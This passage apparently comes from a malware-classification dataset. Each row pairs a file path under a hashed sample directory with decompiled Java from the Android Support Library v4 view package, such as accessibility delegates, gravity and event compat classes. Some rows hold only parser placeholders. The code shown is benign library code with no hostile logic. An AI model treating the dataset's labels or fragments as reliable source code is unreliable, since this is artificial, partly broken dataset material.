AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(host,event);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View host){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(host);       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(host,action,args);       }     } ;   }   public static Object getAccessibilityNodeProvider(  Object delegate,  View host){     return ((View.AccessibilityDelegate)delegate).getAccessibilityNodeProvider(host);   }   public static boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return ((View.AccessibilityDelegate)delegate).performAccessibilityAction(host,action,args);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateIcsImpl.code","static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }     } );   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateJellyBeanImpl.code","static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }       @Override public Object getAccessibilityNodeProvider(      View host){         AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);         if (provider != null) {           return provider.getProvider();         }         return null;       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return compat.performAccessibilityAction(host,action,args);       }     } );   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);     if (provider != null) {       return new AccessibilityNodeProviderCompat(provider);     }     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\AccessibilityDelegateStubImpl.code","static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat listener){     return null;   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return false;   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return true;   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ActionProvider.code","public abstract class ActionProvider {   private static final String TAG=""ActionProvider(support)"";   private final Context mContext;   private SubUiVisibilityListener mSubUiVisibilityListener;   private VisibilityListener mVisibilityListener; public interface SubUiVisibilityListener {     void onSubUiVisibilityChanged(    boolean z);   } public interface VisibilityListener {     void onActionProviderVisibilityChanged(    boolean z);   }   public abstract View onCreateActionView();   public ActionProvider(  Context context){     this.mContext=context;   }   public Context getContext(){     return this.mContext;   }   public View onCreateActionView(  MenuItem forItem){     return onCreateActionView();   }   public boolean overridesItemVisibility(){     return false;   }   public boolean isVisible(){     return true;   }   public void refreshVisibility(){     if (this.mVisibilityListener != null && overridesItemVisibility()) {       this.mVisibilityListener.onActionProviderVisibilityChanged(isVisible());     }   }   public boolean onPerformDefaultAction(){     return false;   }   public boolean hasSubMenu(){     return false;   }   public void onPrepareSubMenu(  SubMenu subMenu){   }   public void subUiVisibilityChanged(  boolean isVisible){     if (this.mSubUiVisibilityListener != null) {       this.mSubUiVisibilityListener.onSubUiVisibilityChanged(isVisible);     }   }   public void setSubUiVisibilityListener(  SubUiVisibilityListener listener){     this.mSubUiVisibilityListener=listener;   }   public void setVisibilityListener(  VisibilityListener listener){     if (this.mVisibilityListener != null && listener != null) {       Log.w(TAG,""setVisibilityListener: Setting a new ActionProvider.VisibilityListener when one is already set. Are you reusing this "" + getClass().getSimpleName() + "" instance while it is still in use somewhere else?"");     }     this.mVisibilityListener=listener;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseKeyEventVersionImpl.code","static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int metaState,  int modifiers,  int basic,  int left,  int right){     boolean wantBasic=(modifiers & basic) != 0;     int directional=left | right;     boolean wantLeftOrRight=(modifiers & directional) != 0;     if (wantBasic) {       if (wantLeftOrRight) {         throw new IllegalArgumentException(""bad arguments"");       }       return metaState & (directional ^ (-1));     }     if (wantLeftOrRight) {       return metaState & (basic ^ (-1));     }     return metaState;   }   @Override public int normalizeMetaState(  int metaState){     if ((metaState & 192) != 0) {       metaState|=1;     }     if ((metaState & 48) != 0) {       metaState|=2;     }     return metaState & 247;   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return (normalizeMetaState(metaState) & 247) == 0;   }   @Override public void startTracking(  KeyEvent event){   }   @Override public boolean isTracking(  KeyEvent event){     return false;   }   @Override public Object getKeyDispatcherState(  View view){     return null;   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseMenuVersionImpl.code","static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return item;   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return item;   }   @Override public View getActionView(  MenuItem item){     return null;   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseMotionEventVersionImpl.code","static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return pointerId == 0 ? 0 : -1;   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public int getPointerCount(  MotionEvent event){     return 1;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseScaleGestureDetectorImpl.code","private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {   private BaseScaleGestureDetectorImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){   }   @Override public boolean isQuickScaleEnabled(  Object o){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseVelocityTrackerVersionImpl.code","static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseViewCompatImpl.code","static class BaseViewCompatImpl implements ViewCompatImpl {   BaseViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return false;   }   @Override public boolean canScrollVertically(  View v,  int direction){     return false;   }   @Override public int getOverScrollMode(  View v){     return 2;   }   @Override public void setOverScrollMode(  View v,  int mode){   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){   }   @Override public void postInvalidateOnAnimation(  View view){     view.postInvalidateDelayed(getFrameTime());   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     view.postDelayed(action,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postDelayed(action,getFrameTime() + delayMillis);   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public void setImportantForAccessibility(  View view,  int mode){   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return false;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   }   @Override public float getAlpha(  View view){     return 1.0f;   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){   }   @Override public int getLayerType(  View view){     return 0;   }   @Override public int getLabelFor(  View view){     return 0;   }   @Override public void setLabelFor(  View view,  int id){   }   @Override public void setLayerPaint(  View view,  Paint p){   }   @Override public int getLayoutDirection(  View view){     return 0;   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){   }   @Override public ViewParent getParentForAccessibility(  View view){     return view.getParent();   }   @Override public boolean isOpaque(  View view){     Drawable bg=view.getBackground();     return bg != null && bg.getOpacity() == -1;   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSize(size,measureSpec);   }   @Override public int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidth();   }   @Override public int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeight();   }   @Override public int getMeasuredState(  View view){     return 0;   }   @Override public int getAccessibilityLiveRegion(  View view){     return 0;   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\BaseViewConfigurationVersionImpl.code","static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\Decor.code","interface Decor { } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\EclairKeyEventVersionImpl.code","static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {   EclairKeyEventVersionImpl(){   }   @Override public void startTracking(  KeyEvent event){     KeyEventCompatEclair.startTracking(event);   }   @Override public boolean isTracking(  KeyEvent event){     return KeyEventCompatEclair.isTracking(event);   }   @Override public Object getKeyDispatcherState(  View view){     return KeyEventCompatEclair.getKeyDispatcherState(view);   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return KeyEventCompatEclair.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\EclairMotionEventVersionImpl.code","static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return MotionEventCompatEclair.findPointerIndex(event,pointerId);   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getPointerId(event,pointerIndex);   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getX(event,pointerIndex);   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getY(event,pointerIndex);   }   @Override public int getPointerCount(  MotionEvent event){     return MotionEventCompatEclair.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\EclairMr1ViewCompatImpl.code","static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {   EclairMr1ViewCompatImpl(){   }   @Override public boolean isOpaque(  View view){     return ViewCompatEclairMr1.isOpaque(view);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\FroyoViewConfigurationVersionImpl.code","static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GBViewCompatImpl.code","static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View v){     return ViewCompatGingerbread.getOverScrollMode(v);   }   @Override public void setOverScrollMode(  View v,  int mode){     ViewCompatGingerbread.setOverScrollMode(v,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GestureDetectorCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@591b8c1a"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GestureDetectorCompatImpl.code","interface GestureDetectorCompatImpl {   boolean isLongpressEnabled();   boolean onTouchEvent(  MotionEvent motionEvent);   void setIsLongpressEnabled(  boolean z);   void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener onDoubleTapListener); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GestureDetectorCompatImplBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@ca6cf80"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GestureDetectorCompatImplJellybeanMr2.code","static class GestureDetectorCompatImplJellybeanMr2 implements GestureDetectorCompatImpl {   private final GestureDetector mDetector;   public GestureDetectorCompatImplJellybeanMr2(  Context context,  GestureDetector.OnGestureListener listener,  Handler handler){     this.mDetector=new GestureDetector(context,listener,handler);   }   @Override public boolean isLongpressEnabled(){     return this.mDetector.isLongpressEnabled();   }   @Override public boolean onTouchEvent(  MotionEvent ev){     return this.mDetector.onTouchEvent(ev);   }   @Override public void setIsLongpressEnabled(  boolean enabled){     this.mDetector.setIsLongpressEnabled(enabled);   }   @Override public void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener listener){     this.mDetector.setOnDoubleTapListener(listener);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GestureHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a42ed8e"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GravityCompat.code","public class GravityCompat {   public static final int END=8388613;   static final GravityCompatImpl IMPL;   public static final int RELATIVE_HORIZONTAL_GRAVITY_MASK=8388615;   public static final int RELATIVE_LAYOUT_DIRECTION=8388608;   public static final int START=8388611; interface GravityCompatImpl {     void apply(    int i,    int i2,    int i3,    Rect rect,    int i4,    int i5,    Rect rect2,    int i6);     void apply(    int i,    int i2,    int i3,    Rect rect,    Rect rect2,    int i4);     void applyDisplay(    int i,    Rect rect,    Rect rect2,    int i2);     int getAbsoluteGravity(    int i,    int i2);   } static class GravityCompatImplBase implements GravityCompatImpl {     GravityCompatImplBase(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return (-8388609) & gravity;     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,outRect);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       Gravity.applyDisplay(gravity,display,inoutObj);     }   } static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {     GravityCompatImplJellybeanMr1(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new GravityCompatImplJellybeanMr1();     }  else {       IMPL=new GravityCompatImplBase();     }   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     IMPL.applyDisplay(gravity,display,inoutObj,layoutDirection);   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return IMPL.getAbsoluteGravity(gravity,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GravityCompatImpl.code","interface GravityCompatImpl {   void apply(  int i,  int i2,  int i3,  Rect rect,  int i4,  int i5,  Rect rect2,  int i6);   void apply(  int i,  int i2,  int i3,  Rect rect,  Rect rect2,  int i4);   void applyDisplay(  int i,  Rect rect,  Rect rect2,  int i2);   int getAbsoluteGravity(  int i,  int i2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GravityCompatImplBase.code","static class GravityCompatImplBase implements GravityCompatImpl {   GravityCompatImplBase(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return (-8388609) & gravity;   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GravityCompatImplJellybeanMr1.code","static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {   GravityCompatImplJellybeanMr1(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\GravityCompatJellybeanMr1.code","class GravityCompatJellybeanMr1 {   GravityCompatJellybeanMr1(){   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return Gravity.getAbsoluteGravity(gravity,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\HCViewCompatImpl.code","static class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   }   @Override public float getAlpha(  View view){     return ViewCompatHC.getAlpha(view);   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){     ViewCompatHC.setLayerType(view,layerType,paint);   }   @Override public int getLayerType(  View view){     return ViewCompatHC.getLayerType(view);   }   @Override public void setLayerPaint(  View view,  Paint paint){     setLayerType(view,getLayerType(view),paint);     view.invalidate();   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   @Override public int getMeasuredWidthAndState(  View view){     return ViewCompatHC.getMeasuredWidthAndState(view);   }   @Override public int getMeasuredHeightAndState(  View view){     return ViewCompatHC.getMeasuredHeightAndState(view);   }   @Override public int getMeasuredState(  View view){     return ViewCompatHC.getMeasuredState(view);   } } "
